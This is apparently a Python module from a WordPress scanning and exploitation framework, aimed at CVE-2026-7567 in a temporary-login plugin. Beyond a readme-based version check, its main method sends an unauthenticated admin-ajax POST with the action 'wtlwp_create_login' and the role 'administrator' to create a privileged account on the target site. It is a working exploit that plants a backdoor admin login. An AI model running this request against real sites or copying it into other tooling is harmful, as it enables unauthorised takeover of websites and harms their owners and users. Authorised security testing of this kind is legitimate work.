# Made by Sn0w8ird

from __future__ import annotations

from urllib.parse import urlencode

from cpointed.core.engine import ScanResult, Target
from cpointed.core.session import CPointedClient
from cpointed.modules.wordpress.base import WordPressModule


class CVE20267567TemporaryLogin(WordPressModule):
    name = "CVE-2026-7567"
    severity = 9.8
    affected_versions = ["temporary-login-without-password: verify against vendor advisory"]
    cwe = "CWE-287 (context-specific)"
    plugin_readme_paths = (
        "/wp-content/plugins/temporary-login-without-password/readme.txt",
        "/wp-content/plugins/temporary-login/readme.txt",
    )
    slug_hint = "temporary"

    async def exploit_remote_primitive(
        self,
        target: Target,
        client: CPointedClient,
        *,
        timeout: float,
    ) -> dict:
        """PoC-shaped POST: nopriv create path + login duration (align nonce with SA)."""
        ajax = self._path(target, "/wp-admin/admin-ajax.php")
        out: dict = {"admin_ajax_posts": []}
        try:
            fields = {
                "action": "wtlwp_create_login",
                "duration": "86400",
                "user_role": "administrator",
                "user_login": "cpointed_temp_audit",
            }
            body = urlencode(fields).encode("utf-8")
            r = await client.request(
                "POST",
                ajax,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                content=body,
                timeout=timeout,
            )
            out["admin_ajax_posts"].append(
                {
                    "path": ajax,
                    "action": fields["action"],
                    "status_code": r.status_code,
                    "body_snippet": (r.text or "")[:2000],
                }
            )
        except Exception as exc:  # pragma: no cover - network
            out["admin_ajax_posts"].append({"action": "wtlwp_create_login", "error": str(exc)})
        return out

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
